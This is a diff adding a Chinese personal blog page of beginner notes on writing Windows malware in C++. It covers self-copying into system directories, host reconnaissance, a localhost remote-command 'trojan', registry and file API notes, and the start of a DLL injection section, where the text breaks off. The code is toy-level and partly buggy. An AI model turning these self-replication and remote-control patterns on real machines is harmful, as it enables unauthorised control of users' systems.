@@ -1,0 +1,1145 @@
+<!DOCTYPE html>
+<head>
+<meta charset="UTF-8" /><title>PureWeb Blog-C++恶意软件入门笔记</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css" /><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>  <script>    document.querySelectorAll('code').forEach((code) => {      if (!code.classList.length) {        code.classList.add('language-bash');      }    });  </script>	<script>		document.addEventListener('DOMContentLoaded', (event) => {			hljs.highlightAll();		});	</script><link rel="stylesheet" href="/github.css">
+<link rel="stylesheet" href="/speciou.css"
+</head><body>    <div class="container">        <header class="main-header">            <h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1>            <nav class="main-header__nav">                <ul class="main-nav">                    <li class="main-nav__list"><a class="main-nav__list__link active" href="/" target="_self">HOME</a>                    </li>                    <li class="main-nav__list"><a class="main-nav__list__link" href="/archives/"                            target="_self">ARCHIVE</a>                    </li>                    <li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn"                            target="_blank">GITHUB</a></li>                </ul>            </nav>        </header>    </div><div class="typora-export os-windows"><div id="write" class>
+<p><strong>2021-3-30 11:01</strong></p>
+<h1>C++恶意软件入门笔记</h1>
+<!-- more -->
+<h2>简单的Windows API</h2>
+<ul>
+<li>
+<p>复制自身到Windows目录</p>
+<ul>
+<li>1-1.获得程序自生API <code>DWORD GetModuleFileName</code></li>
+<li>1-2.获得windows目录 <code>UINT GetWindowsDirectory</code></li>
+<li>1-3.拷贝文件 <code>BOOL CopyFile</code></li>
+</ul>
+</li>
+<li>
+<p>获得系统基本参数</p>
+<ul>
+<li>
+<p>2-1.获得操作系统版本 <code>BOOL GetVersionEx</code></p>
+<ul>
+<li>
+<pre><code class="language-cpp">typedef struct _OSVERSIONINFOA {
+         DWORD dwOSVersionInfoSize;
+         DWORD dwMajorVersion;
+         DWORD dwMinorVersion;
+         DWORD dwBuildNumber;
+         DWORD dwPlatformId;
+         CHAR   szCSDVersion[128];     // Maintenance string for PSS usage
+     } OSVERSIONINFOA, * POSVERSIONINFOA, * LPOSVERSIONINFOA;
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p>2-2.获得计算机名称 <code>BOOL GetComputerName</code></p>
+</li>
+<li>
+<p>2-3.获得当前用户名称  <code>BOOL GetUserName</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-cpp">// API.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。
+//
+
+#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+#include &lt;cstring&gt;
+
+using namespace std;
+
+const int MaxBuf = 0x50;
+
+//1.复制自身到Windows目录
+void CopyMySelf(char* filename)
+{
+    //1-1.获得程序自生API
+    // DWORD GetModuleFileName
+    //1-2.获得windows目录
+    // UINT GetWindowsDirectory
+    //1-3.拷贝文件
+    // BOOL CopyFile
+
+    char szSelfPath[MaxBuf];//程序自身路径
+    char szWinPath[MaxBuf];//windows系统路径
+    char szSysPath[MaxBuf];//系统目录路径
+    char szTmpPath[MaxBuf];//临时变量路径
+
+    GetModuleFileNameA(NULL, szSelfPath, MaxBuf); //获得程序自身路径,可以使用argv[0]代替
+    //strcpy_s(szSelfPath,filename);
+
+    GetWindowsDirectoryA(szWinPath, MaxBuf);//获得windows目录
+    GetSystemDirectoryA(szSysPath, MaxBuf);//获得系统目录
+
+    //windows对这两个目录有权限，无法复制
+    cout &lt;&lt; &quot;----------------------------------------------------\n&quot;;
+    cout &lt;&lt; &quot;Self Path&gt; &quot; &lt;&lt; szSelfPath &lt;&lt; endl;
+    cout &lt;&lt; &quot;Windows Path&gt; &quot; &lt;&lt; szWinPath &lt;&lt; endl;
+    cout &lt;&lt; &quot;System Path&gt; &quot; &lt;&lt; szSysPath &lt;&lt; endl;
+    cout &lt;&lt; &quot;Now start copy\n&quot;;
+    cout &lt;&lt; &quot;----------------------------------------------------\n&quot;;
+
+    strcat_s(szWinPath, &quot;\\API.exe&quot;);
+    strcat_s(szSysPath, &quot;\\API.exe&quot;);
+
+    CopyFileA(szSelfPath, szWinPath, FALSE);
+    CopyFileA(szSelfPath, szSysPath, FALSE);
+
+    cout &lt;&lt; &quot;Self Path&gt; &quot; &lt;&lt; szSelfPath &lt;&lt; endl;
+    cout &lt;&lt; &quot;Windows Path&gt; &quot; &lt;&lt; szWinPath &lt;&lt; endl;
+    cout &lt;&lt; &quot;System Path&gt; &quot; &lt;&lt; szSysPath &lt;&lt; endl;
+    cout &lt;&lt; &quot;SLEF COPY IS DONE\n&quot;;
+    cout &lt;&lt; &quot;----------------------------------------------------\n&quot;;
+    cout &lt;&lt; endl;
+}
+
+//2.获得系统基本参数
+void GetSysInfo()
+{
+    //2-1.获得操作系统版本
+    // BOOL GetVersionEx
+    //  指向 OSVERSIONINFOA结构体
+     //typedef struct _OSVERSIONINFOA {
+     //    DWORD dwOSVersionInfoSize;
+     //    DWORD dwMajorVersion;
+     //    DWORD dwMinorVersion;
+     //    DWORD dwBuildNumber;
+     //    DWORD dwPlatformId;
+     //    CHAR   szCSDVersion[128];     // Maintenance string for PSS usage
+     //} OSVERSIONINFOA, * POSVERSIONINFOA, * LPOSVERSIONINFOA;
+    //2-2.获得计算机名称
+    // BOOL GetComputerName
+    //2-3.获得当前用户名称
+    // BOOL GetUserName
+    OSVERSIONINFOA sysinfo;
+    char szComputerName[MaxBuf];
+    char szUserName[MaxBuf];
+    GetVersionExA(&amp;sysinfo);
+    sysinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
+
+    cout &lt;&lt; &quot;-----------------------------------------------\n&quot;;
+
+    if (&amp;sysinfo)
+    {
+        switch (sysinfo.dwMajorVersion)
+        {
+        case 4:
+            switch (sysinfo.dwMinorVersion)
+            {
+            case 0:
+                if (sysinfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
+                    cout &lt;&lt; &quot;Microsoft Windows NT 4.0\n&quot;; //1996年7月发布 
+                else if (sysinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
+                    cout &lt;&lt; &quot;Microsoft Windows 95\n&quot;;
+                break;
+
+            case 10:
+                cout &lt;&lt; &quot;Microsoft Windows 95\n&quot;;
+                break;
+
+            case 90:
+                cout &lt;&lt; &quot;Microsoft Windows ME\n&quot;;
+                break;
+            default:
+                cout &lt;&lt; &quot;Unkwon\n&quot;;
+                break;
+            }
+        case 5:
+            switch (sysinfo.dwMinorVersion)
+            {
+            case 0:
+                cout &lt;&lt; &quot;Microsoft Windows 2000\n&quot;;
+                break;
+            case 1:
+                cout &lt;&lt; &quot;Microsoft Windows XP&quot;;//2001年8月\n发布
+                break;
+            default:
+                cout &lt;&lt; &quot;Unkwon\n&quot;;
+                break;
+            }
+        default:
+            {
+                cout &lt;&lt; &quot;Other System\n&quot;;
+                cout &lt;&lt; &quot;dwOSVersionInfoSize &quot; &lt;&lt; sysinfo.dwOSVersionInfoSize &lt;&lt; endl;
+                cout &lt;&lt; &quot;dwMajorVersion &quot; &lt;&lt; sysinfo.dwMajorVersion &lt;&lt; endl;
+                cout &lt;&lt; &quot;dwMinorVersion &quot; &lt;&lt; sysinfo.dwMinorVersion &lt;&lt; endl;
+                cout &lt;&lt; &quot;dwBuildNumber &quot; &lt;&lt; sysinfo.dwBuildNumber &lt;&lt; endl;
+                cout &lt;&lt; &quot;dwPlatformId &quot; &lt;&lt; (DWORD)sysinfo.dwPlatformId &lt;&lt; endl;
+            }
+            break;
+        }
+    }
+
+    if (sysinfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
+    {
+        if (sysinfo.dwMajorVersion == 5 &amp;&amp; sysinfo.dwMinorVersion == 1)
+            cout &lt;&lt; &quot;Windwos XP &quot; &lt;&lt; sysinfo.szCSDVersion &lt;&lt; endl;
+        else if (sysinfo.dwMajorVersion == 5 &amp;&amp; sysinfo.dwMinorVersion == 0)
+            cout &lt;&lt; &quot;Windwos 2000 &quot; &lt;&lt; endl;
+    }
+    cout &lt;&lt; &quot;-----------------------------------------------\n&quot;;
+    DWORD buffer1 = MaxBuf;
+    GetComputerNameA(szComputerName, &amp;buffer1);
+    cout &lt;&lt; &quot;Computer Name &quot; &lt;&lt; szComputerName &lt;&lt; endl;
+    cout &lt;&lt; &quot;-----------------------------------------------\n&quot;;
+    DWORD buffer2 = MaxBuf;
+    GetUserNameA(szUserName, &amp;buffer2);
+    cout &lt;&lt; &quot;User Name &quot; &lt;&lt; szUserName &lt;&lt; endl;
+    cout &lt;&lt; &quot;-----------------------------------------------\n&quot;;
+    cout &lt;&lt; szUserName &lt;&lt; &quot;@&quot; &lt;&lt; szComputerName &lt;&lt; endl;
+    cout &lt;&lt; &quot;-----------------------------------------------\n&quot;;
+}
+
+int main(int argc, char** argv)
+{
+    //CopyMySelf(argv[0]);
+    GetSysInfo();
+    system(&quot;pause&quot;);
+}
+</code></pre>
+<h2>TCP//IP连接木马</h2>
+<h3>简单的TCP/IP测试</h3>
+<p><strong>server</strong></p>
+<pre><code class="language-cpp">#include &lt;iostream&gt;
+#include &lt;Winsock2.h&gt;
+
+#pragma comment (lib, &quot;ws2_32&quot;)
+
+using namespace std;
+
+//链接dll
+// 使用该函数来初始化ws2_32.dll
+//int WSAStartup
+
+//释放Dll
+// int WSACleanuo(void)
+
+//创建的套接字
+// SOCKET socket
+// (WSAAPI* LPFN_SOCKET)(
+//    _In_ int af,		//通讯协议簇
+//    _In_ int type,	//要创建的套接字类型
+//    _In_ int protocol //指定程序所用的通讯协议
+//    );
+
+//关闭套接字
+// closesocket
+
+//绑定IP和端口
+// int bind (SOCKET s, socketaddr, int namelen)
+
+//WSAStartup-&gt;socket-&gt;bind-&gt;listen-&gt;accept-&gt;send/recv-&gt;closesocket-&gt;WSACleanup
+
+int main()
+{
+	//1.初始化ws2_32.dll
+	WSADATA wsaData;
+	WSAStartup(MAKEWORD(2,2), &amp;wsaData);
+
+	//2.创建socket套接字
+	//                通讯协议簇  套接字类型    通讯协议
+	SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //socket对象 s
+	sockaddr_in sockaddr;								  //socket 等待对象sockaddr
+	sockaddr.sin_family = PF_INET;
+	sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);//点地址
+	sockaddr.sin_port = htons(1000); //设置端口
+
+	//3.绑定ip和端口
+	bind(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //将socket s 设置为socketaddr类型
+
+	//4.监听
+	listen(s, 1);
+	cout &lt;&lt; &quot;Start Listenning\n&quot;;
+
+	//4.等待连接
+	SOCKADDR clientAddr;
+	int nSize = sizeof(SOCKADDR);
+	SOCKET clientSock;
+	clientSock = accept(s, (SOCKADDR*)&amp;clientAddr, &amp;nSize);//创建连接对象
+	cout &lt;&lt; &quot;Client is on!\n&quot;;
+	//5.recv || send
+	char msg[] = &quot;hello from server\n&quot;;
+
+	send(clientSock, msg, strlen(msg)+sizeof(char), NULL);
+	cout &lt;&lt; &quot;Sending Message\n&quot;;
+
+	//6.断开Socket
+	closesocket(clientSock);
+	closesocket(s);
+	cout &lt;&lt; &quot;Connection close\n&quot;;
+
+	//7.释放ws2_32库
+	WSACleanup();
+	cout &lt;&lt; &quot;Resorces clean\n&quot;;
+	return 0;
+}
+</code></pre>
+<p><strong>client</strong></p>
+<pre><code class="language-cpp">#include &lt;iostream&gt;
+#include &lt;winsock2.h&gt;
+#pragma comment (lib,&quot;ws2_32&quot;)
+
+using namespace std;
+
+//WSAstartup-&gt;socket-&gt;connect-&gt;recv/send-&gt;closesocket-&gt;WSACleanup
+
+int main()
+{
+
+    //1.初始化DLL
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2,2),&amp;wsaData);
+	
+	//2.创建Socket链接对象
+	SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+	sockaddr_in sockaddr;
+	sockaddr.sin_family = PF_INET;
+	sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);
+	sockaddr.sin_port = htons(1000);
+
+	//3.连接到server
+	connect(s, (SOCKADDR *) &amp;sockaddr, sizeof(SOCKADDR));
+
+	//4.设置数据缓冲区
+	char szBuffer[MAXBYTE];
+	recv(s, szBuffer, MAXBYTE, NULL);
+	cout &lt;&lt; &quot;This is msg from server\n&quot;;
+	cout &lt;&lt; &quot; &quot; &lt;&lt; szBuffer;
+
+	//5.关闭socket
+	closesocket(s);
+	WSACleanup();
+	return 0;
+}
+</code></pre>
+<h3>SimpleTCPTorjan</h3>
+<p><strong>server</strong></p>
+<pre><code class="language-cpp">#include &lt;iostream&gt;
+#include &lt;winsock2.h&gt;
+#include &lt;cstring&gt;
+#pragma comment (lib, &quot;ws2_32&quot;)
+using namespace std;
+const int MaxBuf = 0x50;
+//1.完成功能命令的发送
+//2.可以查看远程主机的相关信息，以及复制自身到可执行目录
+//3.打开/关闭光驱
+//4.交换和恢复鼠标左右键
+
+
+//宏定义帮助菜单
+#define HELP &quot;help - Show Help Menu\n&quot; \
+             &quot;getsysinfo - Get System Info\n&quot; \
+             &quot;open - Open The CDRom\n&quot; \
+             &quot;close - Close The CSRom\n&quot; \
+             &quot;swap - Swap Mouse Button\n&quot; \
+             &quot;restore - Restore Mouse Button\n&quot; \
+             &quot;exit - Quit Shell\n&quot;
+
+int main()
+{
+    //1.初始化DLL
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &amp;wsaData);
+
+    //2.创建Socket链接对象
+    SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+    sockaddr_in sockaddr;
+    sockaddr.sin_family = PF_INET;
+    sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);
+    sockaddr.sin_port = htons(1000);
+
+    //3.绑定ip和端口
+    bind(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //将socket s 设置为socketaddr类型
+    listen(s, 1);
+
+    //4.等待连接
+    SOCKADDR clientAddr;
+    int nSize = sizeof(SOCKADDR);
+    SOCKET clientSock;
+    clientSock = accept(s, (SOCKADDR*)&amp;clientAddr, &amp;nSize);//创建连接对象
+    cout &lt;&lt; &quot;Client is on!\n&quot;;
+    //开始监听
+
+    char CMD[MaxBuf];
+    char recver[MaxBuf];
+    memset(CMD, 0, MaxBuf);
+    while (1)
+    {
+        cin &gt;&gt; CMD;
+        if (!strcmp(CMD, &quot;help&quot;))
+            cout &lt;&lt; HELP &lt;&lt; endl;
+        else if (!strcmp(CMD, &quot;getsysinfo&quot;))
+        {
+            send(clientSock, CMD, strlen(CMD) + sizeof(char), NULL);
+            char temp[MaxBuf];
+            memset(temp, 0, MaxBuf);
+            recv(s, temp, strlen(temp) + sizeof(char), NULL);
+            memset(temp, 0, MaxBuf);
+            recv(s, temp, strlen(temp) + sizeof(char), NULL);
+            cout &lt;&lt; &quot;recved?\n&quot;;
+            cout &lt;&lt; temp &lt;&lt;endl;
+        }
+        else
+            send(clientSock, CMD, strlen(CMD) + sizeof(char), NULL);
+        memset(CMD, 0, MaxBuf);
+    }
+
+    //6.断开Socket
+    closesocket(clientSock);
+    closesocket(s);
+    cout &lt;&lt; &quot;Connection close\n&quot;;
+
+    //7.释放ws2_32库
+    WSACleanup();
+    cout &lt;&lt; &quot;Resorces clean\n&quot;;
+    return 0;
+}
+</code></pre>
+<p><strong>client</strong></p>
+<pre><code class="language-cpp">#include &lt;iostream&gt;
+#include &lt;winsock2.h&gt;
+#include &lt;windows.h&gt;
+#pragma comment (lib,&quot;ws2_32&quot;)
+
+using namespace std;
+const int MaxBuf = 0x50;
+
+
+//打开或关闭光驱
+//VOID SetCdaudio(BOOL bOpen)
+//{
+//    if (bOpen)
+//        mciSendStringA(&quot;set cdaudio door open&quot;,NULL,NULL,NULL);
+//    else
+//        mciSendStringA(&quot;set cdaudio door clsoed&quot;, NULL, NULL, NULL);
+//}
+
+VOID MouseSwap(BOOL bSwap)
+{
+    if (bSwap)
+        SwapMouseButton(TRUE);
+    else
+        SwapMouseButton(FALSE);
+}
+
+//对命令进行解析
+BOOL Dispatch(SOCKET &amp;sock, char* szCmd)
+{
+    BOOL bRet = FALSE;
+    if (!strcmp(szCmd, &quot;getsysinfo&quot;))
+    {
+        char szComputerName[MaxBuf];
+        char szUserName[MaxBuf];
+        DWORD buffer1 = MaxBuf;
+        GetComputerNameA(szComputerName, &amp;buffer1);
+        DWORD buffer2 = MaxBuf;
+        GetUserNameA(szUserName, &amp;buffer2);
+        strcat(szUserName, &quot;@&quot;);
+        strcat(szUserName, szComputerName);
+        cout &lt;&lt; szUserName &lt;&lt; endl;
+        send(sock, szUserName, strlen(szUserName) + sizeof(char),NULL);
+        bRet = 1;
+    }
+    //else if (!strcmp(szCmd, &quot;open&quot;))
+    //{
+    //    SetCdaudio(1);
+    //    bRet = 1;
+    //}
+    //else if (!strcmp(szCmd, &quot;clsoe&quot;))
+    //{
+    //    SetCdaudio(0);
+    //    bRet = 1;
+    //}
+    else if (!strcmp(szCmd, &quot;swap&quot;))
+    {
+        MouseSwap(1);
+        bRet = 1;
+    }
+    else if (!strcmp(szCmd, &quot;restore&quot;))
+    {
+        MouseSwap(0);
+        bRet = 1;
+    }
+    else if (!strcmp(szCmd, &quot;exit&quot;))
+        exit(0);
+    else
+        bRet = 0;
+    return bRet;
+}
+
+int main()
+{
+    //1.初始化DLL
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &amp;wsaData);
+
+    //2.创建Socket链接对象
+    SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+    sockaddr_in sockaddr;
+    sockaddr.sin_family = PF_INET;
+    sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);
+    sockaddr.sin_port = htons(1000);
+
+    //3.连接到server
+    connect(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR));
+
+    //4.设置数据缓冲区
+    char szBuffer[MAXBYTE];
+    memset(szBuffer, 0, MaxBuf);
+
+    while (1)
+    {
+        if (s)
+        {
+            recv(s, szBuffer, MAXBYTE, NULL);
+            cout &lt;&lt; szBuffer &lt;&lt; endl;
+            Dispatch(s, szBuffer);
+            memset(szBuffer, 0, MaxBuf);
+        }
+    }
+
+    //5.关闭socket
+    closesocket(s);
+    WSACleanup();
+    return 0;
+}
+</code></pre>
+<p>client回传计算机相关信息有问题</p>
+<h2>Windows文件操作相关API</h2>
+<h3>注册表相关</h3>
+<h4>1.打开注册表</h4>
+<pre><code class="language-cpp">WINADVAPI
+LSTATUS
+APIENTRY
+RegOpenKeyA (
+    _In_ HKEY hKey,
+    _In_opt_ LPCSTR lpSubKey,
+    _Out_ PHKEY phkResult
+    );
+</code></pre>
+<p>使用</p>
+<pre><code class="language-cpp">HKEY hKey;
+long lRet = RegOpenKey(keysname, REG_RUN, &amp;hKey);
+</code></pre>
+<h4>2.注册表查询</h4>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeya">https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeya</a></p>
+<pre><code class="language-cpp">WINADVAPI
+LSTATUS
+APIENTRY
+RegQueryInfoKeyA(
+    _In_ HKEY hKey,					//子键句柄
+    _Out_writes_to_opt_(*lpcchClass,*lpcchClass + 1) LPSTR lpClass,	//指向缓冲区的指针，该缓冲区接收用户定义的键类。此参数可以为NULL。
+    _Inout_opt_ LPDWORD lpcchClass, //该变量指定lpClass参数指向的缓冲区的大小
+    _Reserved_ LPDWORD lpReserved,	//此参数是保留参数，必须为NULL。
+    _Out_opt_ LPDWORD lpcSubKeys,	//指向一个变量的指针，该变量接收指定键所包含的子键的数量。此参数可以为NULL
+    _Out_opt_ LPDWORD lpcbMaxSubKeyLen,//指向变量的指针，该变量以最长的名称接收键的子键的大小，以Unicode字符表示，不包括终止的空字符
+    _Out_opt_ LPDWORD lpcbMaxClassLen,//指向变量的指针，该变量接收以Unicode字符表示的指定子项类的最长字符串的大小
+    _Out_opt_ LPDWORD lpcValues,	//指向变量的指针，该变量接收与键关联的值的数量
+    _Out_opt_ LPDWORD lpcbMaxValueNameLen,//指向变量的指针，该变量接收键的最长值名称的大小（以Unicode字符表示）
+    _Out_opt_ LPDWORD lpcbMaxValueLen,//指向一个变量的指针，该变量接收键值中最长的数据分量的大小（以字节为单位）
+    _Out_opt_ LPDWORD lpcbSecurityDescriptor,//指向一个变量的指针，该变量接收密钥的安全描述符的大小
+    _Out_opt_ PFILETIME lpftLastWriteTime//指向接收最后写入时间的FILETIME结构的指针 。此参数可以为NULL
+    );
+</code></pre>
+<h4>3.注册表写入</h4>
+<pre><code class="language-cpp">WINADVAPI
+LSTATUS
+APIENTRY
+RegSetKeyValueA(
+    _In_ HKEY hKey,
+    _In_opt_ LPCSTR lpSubKey,
+    _In_opt_ LPCSTR lpValueName,
+    _In_ DWORD dwType,
+    _In_reads_bytes_opt_(cbData) LPCVOID lpData,
+    _In_ DWORD cbData
+    );
+</code></pre>
+<h4>4.注册表值的枚举</h4>
+<pre><code class="language-cpp">WINADVAPI
+LSTATUS
+APIENTRY
+RegEnumKeyExA(
+    _In_ HKEY hKey,
+    _In_ DWORD dwIndex,					//查询索引
+    _Out_writes_to_opt_(*lpcchName,*lpcchName + 1) LPSTR lpName,//子键名称
+    _Inout_ LPDWORD lpcchName,			//如果函数成功，则由lpcName指向的变量将包含存储在缓冲区中的字符数，不包括终止的空字符
+    _Reserved_ LPDWORD lpReserved,		//此参数是保留参数，必须为NULL
+    _Out_writes_to_opt_(*lpcchClass,*lpcchClass + 1) LPSTR lpClass,//该缓冲区接收枚举子项的用户定义类
+    _Inout_opt_ LPDWORD lpcchClass,		//如果函数成功，则lpcClass包含缓冲区中存储的字符数，不包括终止的空字符
+    _Out_opt_ PFILETIME lpftLastWriteTime//指向FILETIME结构的指针，该结构接收上一次写入枚举子键的时间
+    );
+</code></pre>
+<h4>5.键值删除</h4>
+<pre><code class="language-cpp">WINADVAPI
+LSTATUS
+APIENTRY
+RegDeleteKeyA (
+    _In_ HKEY hKey,
+    _In_ LPCSTR lpSubKey
+    );
+</code></pre>
+<h3>文件操作相关</h3>
+<h4>1.打开文件</h4>
+<pre><code class="language-cpp">CreateFileA(
+    _In_ LPCSTR lpFileName,               //要打开的文件名字
+    _In_ DWORD dwDesiredAccess,           //访问模式
+    _In_ DWORD dwShareMode,               //文件的共享模式
+    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, //安全属性
+    _In_ DWORD dwCreationDisposition,     //创建或打开文件不存在时的操作
+    _In_ DWORD dwFlagsAndAttributes,      //创建或打开文件的标志和属性
+    _In_opt_ HANDLE hTemplateFile         //文件模板
+);
+</code></pre>
+<h4>2.关闭文件</h4>
+<pre><code class="language-cpp">CloseHandle(
+    _In_ _Post_ptr_invalid_ HANDLE hObject
+    );
+</code></pre>
+<h4>3.删除文件</h4>
+<pre><code class="language-cpp">BOOL
+WINAPI
+DeleteFileA(
+    _In_ LPCSTR lpFileName
+    );
+</code></pre>
+<h4>4.读函数</h4>
+<pre><code class="language-cpp">WINBASEAPI
+_Must_inspect_result_
+BOOL
+WINAPI
+ReadFile(
+    _In_ HANDLE hFile,	//文件句柄
+    _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesReashud) 		__out_data_source(FILE) LPVOID lpBuffer,  //指向一个缓冲区，把数据读取到里面
+    _In_ DWORD nNumberOfBytesToRead,	//要读取的字节数
+    _Out_opt_ LPDWORD lpNumberOfBytesRead, //返回实际的读取数
+    _Inout_opt_ LPOVERLAPPED lpOverlapped //一般设置为NULL
+    );
+</code></pre>
+<h4>5.写函数</h4>
+<pre><code class="language-cpp">WINBASEAPI
+BOOL
+WINAPI
+WriteFile(
+    _In_ HANDLE hFile,
+    _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,
+    _In_ DWORD nNumberOfBytesToWrite,
+    _Out_opt_ LPDWORD lpNumberOfBytesWritten,
+    _Inout_opt_ LPOVERLAPPED lpOverlapped
+    );
+</code></pre>
+<h4>6.设置文件指针</h4>
+<pre><code class="language-cpp">WINBASEAPI
+DWORD
+WINAPI
+SetFilePointer(
+    _In_ HANDLE hFile,				//打开的文件句柄
+    _In_ LONG lDistanceToMove,		//指定要移动的距离
+    _Inout_opt_ PLONG lpDistanceToMoveHigh,  //要移动距离的高32位
+    _In_ DWORD dwMoveMethod			//指定移动位置
+    );
+</code></pre>
+<h4>7.创建目录</h4>
+<pre><code class="language-cpp">WINBASEAPI
+BOOL
+WINAPI
+CreateDirectoryA(
+    _In_ LPCSTR lpPathName,
+    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes
+    );
+</code></pre>
+<h4>8.移动目录</h4>
+<pre><code class="language-cpp">WINBASEAPI
+BOOL
+WINAPI
+RemoveDirectoryA(
+    _In_ LPCSTR lpPathName
+    );
+</code></pre>
+<h3>AutoImmunity的MFC初体验</h3>
+<pre><code class="language-cpp">
+// AutoRunImmunity.cpp: 定义应用程序的类行为。
+//
+
+#include &quot;pch.h&quot;
+#include &quot;framework.h&quot;
+#include &quot;AutoRunImmunity.h&quot;
+#include &quot;AutoRunImmunityDlg.h&quot;
+
+#ifdef _DEBUG
+#define new DEBUG_NEW
+#endif
+
+
+// CAutoRunImmunityApp
+
+BEGIN_MESSAGE_MAP(CAutoRunImmunityApp, CWinApp)
+	ON_COMMAND(ID_HELP, &amp;CWinApp::OnHelp)
+END_MESSAGE_MAP()
+
+
+// CAutoRunImmunityApp 构造
+
+CAutoRunImmunityApp::CAutoRunImmunityApp()
+{
+	// 支持重新启动管理器
+	m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;
+
+	// TODO: 在此处添加构造代码，
+	// 将所有重要的初始化放置在 InitInstance 中
+}
+
+
+// 唯一的 CAutoRunImmunityApp 对象
+
+CAutoRunImmunityApp theApp;
+
+
+// CAutoRunImmunityApp 初始化
+
+BOOL CAutoRunImmunityApp::InitInstance()
+{
+	// 如果一个运行在 Windows XP 上的应用程序清单指定要
+	// 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式，
+	//则需要 InitCommonControlsEx()。  否则，将无法创建窗口。
+	INITCOMMONCONTROLSEX InitCtrls;
+	InitCtrls.dwSize = sizeof(InitCtrls);
+	// 将它设置为包括所有要在应用程序中使用的
+	// 公共控件类。
+	InitCtrls.dwICC = ICC_WIN95_CLASSES;
+	InitCommonControlsEx(&amp;InitCtrls);
+
+	CWinApp::InitInstance();
+
+
+	AfxEnableControlContainer();
+
+	// 创建 shell 管理器，以防对话框包含
+	// 任何 shell 树视图控件或 shell 列表视图控件。
+	CShellManager *pShellManager = new CShellManager;
+
+	// 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题
+	CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));
+
+	// 标准初始化
+	// 如果未使用这些功能并希望减小
+	// 最终可执行文件的大小，则应移除下列
+	// 不需要的特定初始化例程
+	// 更改用于存储设置的注册表项
+	// TODO: 应适当修改该字符串，
+	// 例如修改为公司或组织名
+	SetRegistryKey(_T(&quot;应用程序向导生成的本地应用程序&quot;));
+
+	CAutoRunImmunityDlg dlg;
+	m_pMainWnd = &amp;dlg;
+	INT_PTR nResponse = dlg.DoModal();
+	if (nResponse == IDOK)
+	{
+		// TODO: 在此放置处理何时用
+		//  “确定”来关闭对话框的代码
+	}
+	else if (nResponse == IDCANCEL)
+	{
+		// TODO: 在此放置处理何时用
+		//  “取消”来关闭对话框的代码
+	}
+	else if (nResponse == -1)
+	{
+		TRACE(traceAppMsg, 0, &quot;警告: 对话框创建失败，应用程序将意外终止。\n&quot;);
+		TRACE(traceAppMsg, 0, &quot;警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\n&quot;);
+	}
+
+	// 删除上面创建的 shell 管理器。
+	if (pShellManager != nullptr)
+	{
+		delete pShellManager;
+	}
+
+#if !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS)
+	ControlBarCleanUp();
+#endif
+
+	// 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序，
+	//  而不是启动应用程序的消息泵。
+	return FALSE;
+}
+</code></pre>
+<h2>DLL注入</h2>
+<h4>DLL_Helloworld</h4>
+<pre><code class="language-cpp">// dllmain.cpp : 定义 DLL 应用程序的入口点。
+#include &quot;pch.h&quot;
+
+const int MaxLen = 0x50;
+
+//extern &quot;C&quot; __declspec(dllexport) 
+//VOID MsgBox(wchar_t*szMsg)
+//{
+//    wchar_t szModuleName[MaxLen];
+//    GetModuleFileName(NULL, szModuleName, MaxLen);
+//    MessageBox(NULL,szMsg,szModuleName,MB_OK);
+//}
+
+VOID MsgBox(wchar_t* szMsg)
+{
+    wchar_t szModuleName[MaxLen];
+    GetModuleFileName(NULL, szModuleName, MaxLen);
+    MessageBoxW(NULL, szMsg, szModuleName, MB_OK);
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, //DLL模块句柄
+    DWORD  ul_reason_for_call,//被调用原因
+    LPVOID lpReserved //保留想，傻逼windows
+)//入口函数
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    {
+        MessageBoxA(NULL, &quot;HI&quot;, &quot;Attached&quot;, MB_OK);
+        break;
+    }
+    case DLL_THREAD_ATTACH:
+    {
+        MsgBox((wchar_t*)&quot;Thread attached&quot;);
+        break;
+    }
